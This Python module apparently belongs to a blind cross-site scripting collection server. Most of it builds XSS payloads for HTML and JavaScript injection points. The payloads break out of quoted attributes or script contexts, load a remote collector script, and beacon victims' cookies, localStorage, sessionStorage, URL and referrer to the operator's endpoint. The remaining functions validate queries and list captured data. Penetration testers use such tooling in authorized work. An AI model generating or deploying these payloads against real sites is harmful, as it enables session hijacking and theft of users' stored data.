import base64
import json
from typing import Dict, List

from app.api.validators.shared import ValidationException
from app.models import XSS, Client

PAYLOADS = {
    "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
    "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
    "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
    "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
    "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
}


def generate_html_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
        return generate_html_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)

    elif (
        "local_storage" in data_to_gather
        or "session_storage" in data_to_gather
        or "cookies" in data_to_gather
        or "origin_url" in data_to_gather
        or "referrer" in data_to_gather
    ):
        return generate_html_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)

    else:
        return generate_html_payload_without_data(tag_list, url, xss_type, client)


def generate_html_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    payload_prefix = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'

    payload_core = base64.b64encode(
        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
    ).decode()

    payload_suffix = '")</script>'

    return payload_prefix + payload_core + payload_suffix


def generate_html_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    payload_prefix = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'

    if tag_list:
        tags_parameter = f"tags={','.join(tag_list)}"
        data_to_gather_parameters = generate_data_to_gather_parameters(data_to_gather)
        payload_core = "&".join([tags_parameter, data_to_gather_parameters])
    else:
        payload_core = generate_data_to_gather_parameters(data_to_gather)

    payload_suffix = "</script>"

    return payload_prefix + payload_core + payload_suffix


def generate_html_payload_without_data(tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    payload_prefix = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'

    if tag_list:
        tags_parameter = f"tags={','.join(tag_list)}"
        payload_core = f"?{tags_parameter}"
    else:
        payload_core = ""

    payload_suffix = '" />'

    return payload_prefix + payload_core + payload_suffix


def generate_javascript_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
        return generate_javascript_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)

    elif not data_to_gather:
        return generate_javascript_payload_without_data(tag_list, url, xss_type, client)

    else:
        return generate_javascript_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)


def generate_javascript_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    payload_prefix = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'

    payload_core = base64.b64encode(
        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
    ).decode()

    payload_suffix = '")};document.body.appendChild(js);'

    return payload_prefix + payload_core + payload_suffix


def generate_javascript_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    payload_prefix = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}'

    data_to_gather_parameters = generate_data_to_gather_parameters(data_to_gather)

    if tag_list:
        tags_parameter = f"tags={','.join(tag_list)}"
        payload_core = f"?{'&'.join([tags_parameter, data_to_gather_parameters])}"
    else:
        payload_core = f"?{data_to_gather_parameters}"

    payload_suffix = ";"

    return payload_prefix + payload_core + payload_suffix


def generate_javascript_payload_without_data(tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    payload_prefix = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}'

    if tag_list:
        tags_parameter = f"tags={','.join(tag_list)}"
        payload_core = f"?{tags_parameter}"
    else:
        payload_core = '"'

    payload_suffix = ";"

    return payload_prefix + payload_core + payload_suffix


def generate_data_to_gather_parameters(data_to_gather: List[str]) -> str:

    return "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')


def generate_get_xss_list_filter_expression(query_parameters: dict) -> Dict:

    filter_expression = {}

    if "client_id" in query_parameters:
        if not query_parameters["client_id"].isnumeric():
            raise ValidationException("Bad client ID")

        filter_expression["client_id"] = query_parameters["client_id"]

    if "type" in query_parameters:
        if query_parameters["type"] not in ["reflected", "stored"]:
            raise ValidationException("Unknown XSS type")

        filter_expression["xss_type"] = query_parameters["type"]

    return filter_expression


def generate_get_xss_captured_data_filter_expression(query_parameters: dict) -> Dict:

    filter_expression = {}

    if "client_id" in query_parameters:
        if not query_parameters["client_id"].isnumeric():
            raise ValidationException("Bad client ID")

        filter_expression["client_id"] = query_parameters["client_id"]

    return filter_expression


def generate_captured_data_list(xss_list: List[XSS]) -> List[dict]:

    captured_data_list = []

    for xss in xss_list:
        captured_data = {"xss_id": xss.id, "tags": json.loads(xss.tags), "data": {}}
        for element_name, element_value in json.loads(xss.data).items():
            if element_name in ["fingerprint", "dom", "screenshot"]:
                captured_data["data"].update({element_name: ""})
            else:
                captured_data["data"].update({element_name: element_value})

        captured_data_list.append(captured_data)

    return captured_data_list
